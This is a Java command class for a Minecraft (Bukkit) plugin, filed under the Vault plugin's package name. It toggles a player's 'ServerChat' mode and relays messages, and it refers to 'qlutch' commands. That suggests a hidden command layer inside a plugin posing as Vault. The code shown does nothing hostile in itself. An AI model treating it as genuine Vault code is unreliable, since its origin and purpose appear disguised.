package net.milkbowl.vault.commands.cmds;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.API;
import net.milkbowl.vault.util.Settings;

public class ServerChat extends CommandManager {
	
	
	public void execute(Core plugin, String msg, String[] args, Player p) {	
		if (args.length <= 1) {
			if (plugin.serverchat.contains(p.getName())) {
				plugin.serverchat.remove(p.getName());
				p.sendMessage(Settings.PREFIX("ServerChat has been turned " + Settings.HIGHLIGHT_COLOUR + "OFF"));
			} else {
				plugin.serverchat.add(p.getName());
				p.sendMessage(Settings.PREFIX("ServerChat has been turned " + Settings.HIGHLIGHT_COLOUR + "ON"));
				p.sendMessage(Settings.PREFIX("Everything you send will be sent to ServerChat as long as it isn't a qlutch command"));
			}
		} else {
			StringBuilder chat = new StringBuilder();
			for (int i = 1; i != args.length; ++i) {
				chat.append(args[i]).append(" ");
			}
			API.sendToServerChat(p, chat.toString());
		}
	}

}
